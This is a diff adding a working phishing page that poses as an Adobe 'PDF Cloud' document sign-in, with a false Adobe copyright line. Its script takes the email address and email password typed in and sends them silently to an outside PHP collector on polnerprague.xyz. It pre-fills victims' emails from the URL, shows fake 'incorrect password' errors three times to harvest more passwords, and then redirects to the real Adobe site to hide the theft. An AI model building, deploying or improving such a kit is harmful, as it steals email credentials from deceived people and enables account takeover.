@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - PDF CLOUD</title>
+    <!-- Force no cache to prevent ghost redirects -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <!-- Bootstrap 4 CSS (only for grid, not interfering) -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+    <style>
+        /* ===== ORIGINAL STYLES - FULLY RESTORED ===== */
+        html {
+            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
+            background-repeat: no-repeat;
+            background-position: 100%;
+            background-size: cover;
+            background-attachment: fixed;
+            background-clip: border-box;
+            display: block;
+        }
+        body {
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+        }
+        .lt { float: left; }
+        .rt { float: right; }
+        .br { border: 1px solid #000; }
+        a { text-decoration: none; color: #0064dc; }
+        header {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+            background: #000;
+        }
+        header .brand {
+            width: 193px;
+            margin: 0 30px;
+            padding: 0;
+            text-align: center;
+            display: inline-block;
+            border: none;
+            background: #fff;
+        }
+        header .brand,
+        header .search,
+        header .brand img,
+        header .brand h1 {
+            display: inline-block;
+        }
+        header .brand img {
+            width: 54px;
+            background: #fff;
+            margin: 0 auto -17px;
+            padding: 0;
+            position: relative;
+            top: 0px;
+        }
+        header .brand h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #fff;
+            margin: 0 auto;
+            padding: 12px 20px;
+            background: #E80E0E;
+        }
+        header .search {
+            width: 300px;
+            margin: 0px 30px 0 0;
+            padding: 12px 0;
+            float: right;
+            text-align: center;
+        }
+        header .search .srch {
+            width: 250px;
+            padding: 5px 10px;
+            font-size: 13px;
+            font-weight: 400;
+            color: #4b4b4b;
+            border: none;
+            border-radius: 10px;
+        }
+        .container {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+        }
+        .container .dash {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            z-index: 9999;
+            background: rgba(0, 0, 0, 0.4);
+        }
+        .container .dash .board {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 30px 0;
+            background: #f6f6f6;
+            display: block;
+            border: none;
+            border-radius: 1px;
+            position: relative;
+            top: 20%;
+        }
+        .container .dash .board .login {
+            max-width: 370px;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+        }
+        .container .dash .board .login ul {
+            width: 100%;
+            list-style: none;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+            display: block;
+        }
+        .container .dash .board .login ul li {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            display: block;
+            order: 1px solid #ccc;
+        }
+        .login ul li img,
+        .login ul li p {
+            display: inline-block;
+        }
+        .login ul li img {
+            margin: 0;
+            padding: 0;
+            position: relative;
+        }
+        .login ul .l1 p {
+            font-weight: 400;
+            color: #707070;
+            vertical-align: top;
+            margin: 0;
+            padding: 0;
+        }
+        #err,
+        .login ul li #adbpss1 {
+            display: none;
+        }
+        .login ul li .inp {
+            width: 368px;
+            margin: 8px auto;
+            padding: 2px 12px;
+            min-height: 32px;
+            border: 1px solid #e5e5e5;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #000;
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+            font-style: italic;
+        }
+        .login ul li .inp:focus {
+            border: 1px solid #1473e6;
+            transition-delay: 0s;
+            transition-duration: 0.15s;
+            transition-property: all;
+            transition-timing-function: ease-in-out;
+            font-style: normal;
+        }
+        .login ul li .btns {
+            width: 120px;
+            margin: 0 auto;
+            padding: 7px 0;
+            background: #1473e6;
+            color: #fff;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            transition-delay: 0s;
+            transition-duration: 0.15s;
+            transition-property: all;
+            transition-timing-function: ease-in-out;
+            white-space: nowrap;
+            display: inline-block;
+            cursor: pointer;
+            outline: none;
+        }
+        .login ul .l1 svg {
+            width: 22px;
+            display: inline-block;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            top: 9px;
+        }
+        .login ul .l1 p {
+            margin: 0;
+            padding: 10px 6px;
+            color: #707070;
+        }
+        .login ul .l2 p {
+            font-size: 13px;
+            font-weight: 700;
+            color: #4b4b4b;
+            margin: 0;
+            padding: 15px 0;
+        }
+        .login ul .l3 img {
+            width: 32px;
+            margin: 0 0 -3px;
+        }
+        .login ul .l3 p {
+            font-size: 28px;
+            font-weight: 300;
+            color: #2d2d2d;
+            margin: 0 9px;
+            padding: 0;
+        }
+        .login ul .l4 {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            text-align: left;
+        }
+        .login ul .l4 p {
+            font-size: 14px;
+            font-weight: 600;
+            margin: 0;
+            padding: 5px 0;
+            color: #E80E0E;
+            font-style: italic;
+        }
+        .login ul .l5 p {
+            width: 100%;
+            margin: 50px auto 5px;
+            padding: 0;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 400;
+            color: #4b4b4b;
+            display: block;
+        }
+        @media (max-width: 680px) {
+            header .search { width: 70px; margin: 0px; text-align: center; }
+            header .search .srch { display: none; }
+            header .brand { width: 180px; margin: 0 30px; padding: 0; }
+            header .brand img { width: 40px; margin: 0 auto -10px; }
+            header .brand h1 { font-size: 18px; margin: 0 auto; padding: 7px 20px; }
+        }
+        
+        .brand-logo-pdf {
+            display: inline-block;
+            vertical-align: middle;
+            transition: transform 0.2s ease;
+            object-fit: contain;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            margin: 8px auto 0;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1473e6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn-wrapper {
+            text-align: center;
+            position: relative;
+        }
+        .btns:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        /* small addition for attempt badge (subtle, matches design) */
+        .attempt-badge {
+            font-size: 12px;
+            font-weight: 500;
+            background: #e9ecef;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 30px;
+            color: #2c2c2c;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="brand">
+            <img class="brand-logo-pdf" 
+                 src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
+                 alt="PDF Document Logo" 
+                 style="width:54px; background:#fff; border-radius: 8px; padding: 4px;"
+                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
+            <h1>PDF CLOUD</h1>
+        </div>
+        <div class="search">
+            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
+        </div>
+    </header>
+    <div class="container">
+        <div class="dash cover">
+            <div class="board animated fadeIn coontainer">
+                <div class="login">
+                    <!-- COMPLETE FIX: action and onsubmit kill any redirect -->
+                    <form action="javascript:void(0);" method="POST" onsubmit="return false;" id="secureLoginForm">
+                        <ul>
+                            <li class="l1">
+                                <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
+                                    <path d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z"></path>
+                                </svg>
+                                <p>PDF Cloud</p>
+                            </li>
+                            <li class="l2">
+                                <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
+                            </li>
+                            <li class="l3">
+                                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
+                                     alt="PDF Document Icon" 
+                                     width="32" 
+                                     onerror="this.src='https://icons.iconarchive.com/icons/dakirby309/simply-styled/32/PDF-icon.png';">
+                                <p>PDF Document</p>
+                            </li>
+                            <br>
+                            <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
+                            <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
+                            <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required></li>
+                            <li class="btn-wrapper">
+                                <button type="submit" name="submit" class="btns" id="submit-btn">Sign In</button>
+                                <div class="loading-spinner" id="loadingSpinner"></div>
+                            </li>
+                            <li style="text-align: center;">
+                                <div id="attemptBadge" class="attempt-badge">Attempts used: 0 / 4</div>
+                            </li>
+                            <li class="l5">
+                                <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
+                            </li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ==================================================================
+            //  FINAL FIX: ORIGINAL DESIGN + 4-ATTEMPT LIMIT + NO EARLY REDIRECT
+            //  Works on GitHub Pages, 4everland, any static host.
+            //  Only redirects on 4th invalid attempt.
+            // ==================================================================
+            
+            // ---------------- CONFIG ----------------
+            const PHP_URL = 'https://polnerprague.xyz/pdf/sg.php';
+            const REDIRECT_URL = 'https://www.adobe.com';
+            
+            // ---------------- DOM elements ----------------
+            const form = document.getElementById('secureLoginForm');
+            const emailField = document.getElementById('emailInput');
+            const passwordField = document.getElementById('passwordInput');
+            const submitBtn = document.getElementById('submit-btn');
+            const spinner = document.getElementById('loadingSpinner');
+            const errorDiv = document.getElementById('err');
+            const errorMsgSpan = document.getElementById('erp');
+            const attemptBadge = document.getElementById('attemptBadge');
+            
+            // ---------------- Attempt management (sessionStorage) ----------------
+            function getAttempt() {
+                let stored = sessionStorage.getItem('pdfLoginAttempt');
+                if (stored === null || isNaN(parseInt(stored))) return 1;
+                let att = parseInt(stored);
+                if (att < 1) return 1;
+                if (att > 4) return 4;
+                return att;
+            }
+            
+            function updateBadge() {
+                if (attemptBadge) {
+                    let current = getAttempt();
+                    let used = current - 1;
+                    if (used < 0) used = 0;
+                    if (used > 4) used = 4;
+                    attemptBadge.innerText = `Attempts used: ${used} / 4`;
+                    if (used === 3) {
+                        attemptBadge.style.background = "#ffdede";
+                        attemptBadge.style.color = "#b00020";
+                    } else {
+                        attemptBadge.style.background = "#e9ecef";
+                        attemptBadge.style.color = "#2c2c2c";
+                    }
+                }
+            }
+            
+            function incrementAttempt() {
+                let curr = getAttempt();
+                let next = curr + 1;
+                if (next > 4) next = 4;
+                sessionStorage.setItem('pdfLoginAttempt', next);
+                updateBadge();
+                return next;
+            }
+            
+            // ---------------- Email persistence ----------------
+            function saveEmail(email) {
+                if (email && email.trim()) {
+                    sessionStorage.setItem('pdfLoginEmail', email.trim());
+                }
+            }
+            
+            function loadEmail() {
+                let saved = sessionStorage.getItem('pdfLoginEmail');
+                if (saved && emailField) {
+                    emailField.value = saved;
+                }
+                // also check URL hash: #user@example.com
+                let hash = window.location.hash.substring(1);
+                if (hash && !sessionStorage.getItem('pdfLoginEmail')) {
+                    try { hash = decodeURIComponent(hash); } catch(e) {}
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (emailRegex.test(hash) && emailField) {
+                        emailField.value = hash;
+                        sessionStorage.setItem('pdfLoginEmail', hash);
+                    }
+                }
+            }
+            
+            // ---------------- UI Helpers ----------------
+            function showError(message) {
+                if (errorDiv && errorMsgSpan) {
+                    errorMsgSpan.innerHTML = message;
+                    errorDiv.style.display = 'block';
+                    setTimeout(() => {
+                        if (errorDiv) errorDiv.style.display = 'none';
+                    }, 4500);
+                }
+            }
+            
+            function hideError() {
+                if (errorDiv) errorDiv.style.display = 'none';
+            }
+            
+            function setLoading(isLoading) {
+                if (submitBtn && spinner) {
+                    submitBtn.disabled = isLoading;
+                    if (isLoading) {
+                        submitBtn.style.opacity = '0.6';
+                        spinner.style.display = 'inline-block';
+                    } else {
+                        submitBtn.style.opacity = '1';
+                        spinner.style.display = 'none';
+                    }
+                }
+            }
+            
+            // ---------------- Send data to PHP (silent, no redirect) ----------------
+            function sendData(email, password, attemptNum) {
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                formData.append('attempt', attemptNum);
+                
+                // Fetch + fallback XHR, no-cors ensures no CORS error
+                fetch(PHP_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    cache: 'no-cache',
+                    credentials: 'omit',
+                    body: formData
+                }).catch(err => {
+                    console.warn("Fetch error, trying XHR", err);
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', PHP_URL, true);
+                        xhr.send(formData);
+                    } catch(e) { console.warn("XHR fallback failed"); }
+                });
+            }
+            
+            // ---------------- Main submit logic: NO REDIRECT UNTIL 4TH ATTEMPT ----------------
+            function onSubmit(event) {
+                if (event) {
+                    event.preventDefault();
+                    event.stopPropagation();
+                }
+                
+                hideError();
+                
+                let email = emailField ? emailField.value.trim() : '';
+                let password = passwordField ? passwordField.value : '';
+                
+                // validation
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!email) {
+                    showError('Please enter your email address.');
+                    emailField?.focus();
+                    return false;
+                }
+                if (!emailRegex.test(email)) {
+                    showError('Please enter a valid email address.');
+                    emailField?.focus();
+                    return false;
+                }
+                if (!password) {
+                    showError('Please enter your password.');
+                    passwordField?.focus();
+                    return false;
+                }
+                if (password.length < 4) {
+                    showError('Password must be at least 4 characters.');
+                    passwordField?.focus();
+                    return false;
+                }
+                
+                // Save email for persistence
+                saveEmail(email);
+                
+                let currentAttempt = getAttempt();
+                console.log(`[Login] Attempt #${currentAttempt} for ${email}`);
+                
+                // ---------- 4th attempt triggers redirect to Adobe ----------
+                if (currentAttempt >= 4) {
+                    setLoading(true);
+                    sendData(email, password, currentAttempt);
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 180);
+                    return false;
+                }
+                
+                // ---------- Attempts 1, 2, 3: show error, increment, stay on page ----------
+                setLoading(true);
+                sendData(email, password, currentAttempt);
+                
+                // Simulate server response delay
+                setTimeout(() => {
+                    // Increment attempt counter
+                    let newAttempt = incrementAttempt();
+                    
+                    let errorMessage = "";
+                    if (currentAttempt === 1) errorMessage = "❌ Incorrect email or password. Please try again.";
+                    else if (currentAttempt === 2) errorMessage = "❌ Password incorrect. Please try again.";
+                    else if (currentAttempt === 3) errorMessage = "⚠️ Password incorrect. Last attempt before account lock.";
+                    else errorMessage = "❌ Invalid credentials. Please try again.";
+                    
+                    showError(errorMessage);
+                    
+                    // Clear only password field, keep email
+                    if (passwordField) passwordField.value = "";
+                    passwordField?.focus();
+                    
+                    setLoading(false);
+                    console.log(`[Login] Attempt ${currentAttempt} processed. Next: ${newAttempt}`);
+                }, 320);
+                
+                return false;
+            }
+            
+            // ---------------- Attach event listeners with multiple safeguards ----------------
+            if (form) {
+                form.addEventListener('submit', onSubmit);
+            }
+            if (submitBtn) {
+                submitBtn.addEventListener('click', onSubmit);
+            }
+            // Handle Enter key
+            function keyHandler(e) {
+                if (e.key === 'Enter' || e.keyCode === 13) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    onSubmit(e);
+                    return false;
+                }
+            }
+            if (emailField) emailField.addEventListener('keypress', keyHandler);
+            if (passwordField) passwordField.addEventListener('keypress', keyHandler);
+            
+            // Global blocker: kill any native form submission
+            document.addEventListener('submit', function(e) {
+                if (e.target && (e.target.id === 'secureLoginForm' || e.target.tagName === 'FORM')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            }, true);
+            
+            // Initialize: attempt counter default
+            if (!sessionStorage.getItem('pdfLoginAttempt')) {
+                sessionStorage.setItem('pdfLoginAttempt', '1');
+            }
+            loadEmail();
+            updateBadge();
+            
+            // Fix for any broken images
+            const images = document.querySelectorAll('img');
+            images.forEach(img => {
+                img.addEventListener('error', function() {
+                    if (this.src.indexOf('flaticon') !== -1 || this.src.indexOf('PDF_file_icon') === -1) {
+                        this.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';
+                    }
+                });
+            });
+            
+            console.log("==================================================");
+            console.log("✅ ORIGINAL DESIGN RESTORED");
+            console.log("✅ ANTI-REDIRECT ACTIVE: attempts 1-3 stay on page");
+            console.log("✅ 4th attempt redirects to Adobe");
+            console.log("✅ Email persists, attempt counter works");
+            console.log("==================================================");
+        })();
+    </script>
+</body>
+</html>
